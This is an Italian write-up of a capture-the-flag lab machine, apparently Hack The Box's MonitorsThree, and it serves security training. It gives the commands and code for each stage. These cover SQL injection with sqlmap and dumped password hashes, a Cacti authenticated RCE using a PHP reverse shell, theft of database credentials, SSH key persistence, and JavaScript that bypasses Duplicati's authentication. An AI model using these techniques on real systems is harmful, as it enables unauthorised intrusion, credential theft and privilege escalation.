+++
date = '2026-08-23T00:50:54+02:00'
draft = false
title = 'MonitorsThree Writeup IT'
+++
**Autore**: **`joy.scd01`**

**Data**: **`21/08/2026`**

![pwn.png](/images/imgs_monitors3/pwn.png)

---
# Introduzione

**_MonitorsThree_** è una macchina **Linux** di livello **Medium** incentrata su un'approfondita enumerazione web, sullo sfruttamento di applicazioni custom e sull'abuso di servizi locali.

Il punto d'accesso iniziale richiede la scoperta di un **virtual host** e lo sfruttamento di una **SQL Injection** all'interno di una funzione di **forgot-password** per estrarre delle credenziali. Dopo aver craccato gli hash, otteniamo l'accesso a un'istanza **Cacti** e sfruttiamo una recente **RCE Autenticata** per ottenere una shell.

Il movimento laterale prevede l'enumerazione del database di **Cacti** per recuperare e craccare l'hash di un altro utente. Infine, per la Privilege Escalation, scopriamo un servizio interno **Duplicati**. Rubando il suo database **SQLite** locale, possiamo **bypassare il meccanismo di autenticazione** e abusare della funzionalità di ripristino dei backup (**backup restore**) per **leggere file** dal filesystem, arrivando infine alla **root flag**.

---
# Tecniche Utilizzate

- **Virtual Host Enumeration**

- **Error-Based SQL Injection**

- **Hash Cracking**

- **Cacti Authenticated RCE (CVE-2024-25641)**

- **Internal Port Forwarding** 

- **Duplicati Authentication Bypass**

- **Abusing Backup Restore for Privilege Escalation**

---
# Enumerazione

## nmap

Scansione iniziale su tutte le porte:

```bash
nmap -p- monitors3
```

```text
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
8084/tcp filtered websnp
```

Scansione mirata con script e rilevamento delle versioni:

```bash
nmap -sC -sV monitors3
```

```text
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
80/tcp   open     http    nginx 1.18.0 (Ubuntu)
|_http-title: MonitorsThree - Networking Solutions
|_http-server-header: nginx/1.18.0 (Ubuntu)
8084/tcp filtered websnp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Porte Aperte**:

- **22**/tcp - SSH

- **80**/tcp - HTTP

- **8084**/tcp - websnp (filtered)

## Enumerazione Web

Visitando la pagina web sulla porta 80, ho notato due cose interessanti:

**`1`** Un'email esposta che faceva riferimento al dominio **`monitorsthree.htb`**, che ho aggiunto al mio file **`/etc/hosts`**.

![web2.png](/images/imgs_monitors3/web2.png)

**`2.`** Una pagina di login.

![web1.png](/images/imgs_monitors3/web1.png)

Poiché non riuscivo a raggiungere il servizio **websnp** sulla porta **`8084`**, ho iniziato a testare la pagina di login. Non si trattava di un **CMS** o di una piattaforma nota, quindi ho semplicemente intercettato una richiesta di login con **Burp Suite**, l'ho salvata in un file **`req.req`** e ho sostituito i parametri **`username`** e **`password`** con **`*`**.

![login_req.png](/images/imgs_monitors3/login_req.png)

L'ho data in pasto a **sqlmap** per cercare eventuali **SQL injection**:

```bash
sqlmap -r req.req --level 5 --risk 3 --dbs
```

L'attacco stava impiegando molto tempo, quindi in background ho lanciato una scansione veloce delle directory con **Gobuster**:

```bash
gobuster dir -u http://monitors3 -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Non è emerso nulla di immediatamente utile, a parte una entry **`/admin`** che restituiva un **403 Forbidden**.

Sono passato quindi a enumerare i virtual host usando **ffuf**:

```bash
ffuf -u http://monitorsthree.htb -H 'HOST: FUZZ.monitorsthree.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 13560
```

![ffuf.png](/images/imgs_monitors3/ffuf.png)

Ho ottenuto un riscontro con il sottodominio **`cacti`**. Ho aggiunto **`cacti.monitorsthree.htb`** al mio file **`/etc/hosts`** e l'ho visitato.
Era hostata un'istanza di login di **Cacti** e la versione era: **`1.2.26`**.

![cacti.png](/images/imgs_monitors3/cacti.png)

Ho cercato vulnerabilità note:

```bash
searchsploit cacti 1.2.26
```

![scsploit.png](/images/imgs_monitors3/scsploit.png)

È emersa un'**Authenticated RCE**. Non avendo credenziali a disposizione, mi sono concentrato sulla **SQL injection**.

---
# Accesso Iniziale | SQLi to Cacti RCE

**sqlmap** non ha trovato nulla sul form di login principale e anche i payload manuali non restituivano nulla. Tuttavia, c'era la pagina **`forgot_password.php`**.
L'ho testata manualmente con semplici payload e ho ottenuto un **Errore SQL** inserendo **`'`**. **Il punto d'injection era quello**.

![sql_error.png](/images/imgs_monitors3/sql_error.png)

Ho intercettato la richiesta di reset della password

![reset_req.png](/images/imgs_monitors3/reset_req.png)

l'ho salvata come **`req.req`** e ho lanciato nuovamente **sqlmap**:

```bash
sqlmap -r req.req --level 5 --risk 3 --dbs
```

![sql1.png](/images/imgs_monitors3/sql1.png)

Questa volta ha recuperato con successo i database, incluso **`monitorsthree_db`**. Ho proceduto ad enumerare le tabelle:

```bash
sqlmap -r req.req --level 5 --risk 3 -D monitorsthree_db --tables
```

![sql2.png](/images/imgs_monitors3/sql2.png)

Ho trovato una tabella **`users`** e ne ho dumpato il contenuto:

```bash
sqlmap -r req.req --level 5 --risk 3 -D monitorsthree_db -T users --dump
```

![sql3.png](/images/imgs_monitors3/sql3.png)

4 hash:

```text
admin:31a181c8372e3afc59dab863430610e8
mwatson:c585d01f2eb3e6e1073e92023088a3dd
janderson:1e68b6eb86b45f6d92f8f292428f77ac
dthompson:633b683cc128fe244b00f176c8a950f5
```

Ho craccato l'hash di **admin**

![cracked.png](/images/imgs_monitors3/cracked.png)

e ho effettuato l'accesso alla piattaforma **Cacti**.

![cacti_logged.png](/images/imgs_monitors3/cacti_logged.png)

A questo punto, mi sono ricordato della **CVE** trovata prima. Ho cercato online per capire meglio l'exploit e ho trovato l'advisory su **GitHub**:

- **https://github.com/cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88**

**Nota**: _Questa specifica vulnerabilità (**GHSA-7cmj-g5qc-pj88**) permette ad un utente autenticato di ottenere **Remote Code Execution** abusando della funzione di **Package Import**. L'applicazione non sanitizza correttamente i dati importati, il che significa che un attaccante può creare un pacchetto malevolo, iniettare un payload **PHP** in campi come **`filedate`** ed eseguirlo navigando verso la risorsa appena creata._

Per sfruttarla manualmente:

**`1.`** Ho copiato lo script dalla pagina **GitHub**.

**`2.`** Ho inserito del codice **PHP** per una reverse shell all'interno del campo **`filedate`** e ho generato l'archivio malevolo (**`mal.php`**).

![mal.png](/images/imgs_monitors3/mal.png)

**`3.`** All'interno di **Cacti**, sono andato su **`Import/Export --> Import Package`**, ho selezionato l'archivio generato e l'ho importato.

![inti1.png](/images/imgs_monitors3/init1.png)

**`4.`** Ho impostato un listener con **netcat** e ho richiamato il payload: [http://cacti.monitorsthree.htb/cacti/resource/test.php](http://cacti.monitorsthree.htb/cacti/resource/test.php).

Ho ricevuto con successo una shell come **`www-data`**.

![initial.png](/images/imgs_monitors3/initial.png)

---
# Lateral Movement | Database Enum to Marcus

Dopo aver stabilizzato la shell, ho seguito la mia solita metodologia per **Cacti** (simile a quanto avevo fatto su **_Monitors_** e **_MonitorsTwo_**) e ho puntato al file di configurazione del database.

```bash
cat /var/www/html/cacti/include/config.php
```

![conf.png](/images/imgs_monitors3/conf.png)

Ho estratto le credenziali del database e mi sono connesso a **MySQL**:

```bash
mysql -D cacti -u cactiuser -p 
```

Ho controllato la tabella **`user_auth`** per dumpare gli hash dell'applicazione:

```SQL
show databases;
use cacti;
show tables;
select * from user_auth\G;
```

![cacti_db.png](/images/imgs_monitors3/cacti_db.png)

Ho trovato un hash per l'utente **`marcus`**. Dal momento che era l'utente principale nelle macchine precedenti della saga, sapevo che craccare il suo hash era la strada giusta.

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![john.png](/images/imgs_monitors3/john.png)

Ho provato a connettermi tramite **SSH**, ma l'autenticazione tramite password era disabilitata:

![ssh_fail.png](/images/imgs_monitors3/ssh_fail.png)

Quindi, ho semplicemente cambiato utente dalla mia shell **`www-data`** attuale:

```bash
su marcus
```

Ho recuperato la **user flag**:

```bash
cat /home/marcus/user.txt
```

![userf.png](/images/imgs_monitors3/userf.png)

Per un accesso persistente, ho aggiunto la mia **chiave RSA** pubblica in **`/home/marcus/.ssh/authorized_keys`** e mi sono connesso tramite **SSH**.

![persistance.png](/images/imgs_monitors3/persistance.png)

---
# Privilege Escalation | Duplicati Exploit

Ho iniziato l'enumerazione manuale interna per cercare servizi interni:

```bash
ss -tuln
```

![sstuln.png](/images/imgs_monitors3/sstuln.png)

Questo ha rivelato un servizio interno in ascolto sulla porta **`8200`**. Avendo accesso **SSH**, ho creato un tunnel:

```bash
ssh -L 8200:127.0.0.1:8200 marcus@monitorsthree.htb -i id_rsa
```

![tunnel.png](/images/imgs_monitors3/tunnel.png)

Navigando su **`localhost:8200`**, ho trovato un form di login di **Duplicati**. Non sapevo bene cosa fosse, quindi ho fatto una rapida ricerca.

**Nota**: _**Duplicati** è un client di backup open-source gratuito che archivia in modo sicuro backup incrementali e crittografati su storage remoto o locale. Funziona tramite un'interfaccia web locale, motivo per cui era in ascolto sulla porta interna **`8200`**. Dato che gestisce i backup di sistema, in genere richiede elevati permessi di accesso ai file, rendendolo un bersaglio ideale per la Privilege Escalation._

Inizialmente, ho cercato file di configurazione sperando di trovare una password in chiaro:

```bash
locate duplicati
ls -lha /opt/duplicati/config
```

Ho visto il file **`Duplicati-server.sqlite`**. Poiché **sqlite3** non era installato sulla macchina, l'ho scaricato sulla mia macchina **Kali** tramite **netcat** per analizzarlo localmente.
Mi sono connesso al **DB** ma non sapevo bene cosa cercare. Cercando online eventuali vulnerabilità, ho trovato una vulnerabilità di **authentication bypass**:

- **https://github.com/duplicati/duplicati/issues/5197**

Per sfruttarla, avevo bisogno della **`Server_passphrase`**, che era salvata nella tabella **`Option`** del database **SQLite**:

```bash
sqlite3 Duplicati-server.sqlite
sqlite> .tables;
sqlite> select * from Option;
```

![sqlite.png](/images/imgs_monitors3/sqlite.png)

Dopo aver recuperato la passphrase, ho seguito la guida su **GitHub**. Ho intercettato la risposta di login dopo aver inviato una password casuale, che ha restituito un **Nonce** e un **Salt**:

![salt.png](/images/imgs_monitors3/salt.png)

Ho convertito la **`Server_passphrase`** da **base64** a **hex**:

```bash
echo 'Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=' | base64 -d | xxd -p
```

Poi, ho creato il payload per il bypass usando la console del browser:

```JavaScript
var saltedpwd = '59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a'; // Hex output
var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('uMINN1xt0j17kxIJSAMv7Ev+zjFEumbD0AxF7pHpt6M=') + saltedpwd)).toString(CryptoJS.enc.Base64); // Replaced Nonce from Burp
console.log(noncedpwd);
```

![console.png](/images/imgs_monitors3/console.png)

Ho copiato il valore restituito, ho inoltrato la richiesta su **Burp Suite**, ho incollato il valore nel parametro della password (**URL-encode**) e ho bypassato con successo il meccanismo di autenticazione.

![dupli_bypass.png](/images/imgs_monitors3/dupli_bypass.png)

Non essendoci exploit specifici per la PrivEsc di questa versione, ho deciso di abusare della funzionalità principale: il **Ripristino dei Backup**.

Ho iniziato a interagire con la funzione "**Add Backup**":

- Ho impostato **Encryption** su **No Encryption**

![privesc1.png](/images/imgs_monitors3/privesc1.png)

Per la "**backup destination**", ho notato che la directory **`/source`** esponeva quello che sembrava essere il filesystem dell'host (contenente la home di **`marcus`**, ecc.). Questo significava che **`/Computer`** era probabilmente il filesystem del container/app.

- Ho selezionato una directory accessibile come destinazione: **`/source/home/marcus/`**.

![privesc2.png](/images/imgs_monitors3/privesc2.png)

- Per "**Source Data**", ho selezionato **`/Computer/source/root/`** per fare il backup della cartella root dell'host.

![privesc3.png](/images/imgs_monitors3/privesc3.png)

Ho deselezionato "**Automatically run backups**" per evitare errori di data/ora e ho salvato.

![privesc4.png](/images/imgs_monitors3/privesc4.png)

**Run now**.

![privesc5.png](/images/imgs_monitors3/privesc5.png)

Una volta terminato il backup, sono andato su **Restore files**. 

![privesc6.png](/images/imgs_monitors3/privesc6.png)

Inizialmente ho cercato una **chiave SSH** ma non era presente, quindi ho semplicemente selezionato il file **`root.txt`**.
Ho scelto **`/source/home/marcus/`** come percorso della cartella di ripristino e ho cliccato su **restore**.

Controllando la home directory di **`marcus`** dalla mia shell **SSH**, ho trovato il file ripristinato e ho potuto leggere la **root flag**.

![rootf.png](/images/imgs_monitors3/rootf.png)

---
# Considerazioni Finali

Ottima continuazione della saga. Rispetto a **_Monitors_**, si posiziona decisamente nella fascia di difficoltà **Medium**.
I passaggi sono logici e l'accesso iniziale richiede una solida enumerazione web manuale e occhio per identificare la **SQL injection**. La fase di Privilege Escalation è stata molto interessante: dover esfiltrare un database **SQLite** per bypassare l'autenticazione e poi sfruttare le meccaniche di backup previste dall'applicazione per leggere il filesystem dell'host è stata una chain davvero geniale.

**Fonti**:

- **Cacti RCE (GHSA-7cmj-g5qc-pj88) | https://github.com/cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88**

- **Duplicati Auth Bypass (#5197) | https://github.com/duplicati/duplicati/issues/5197**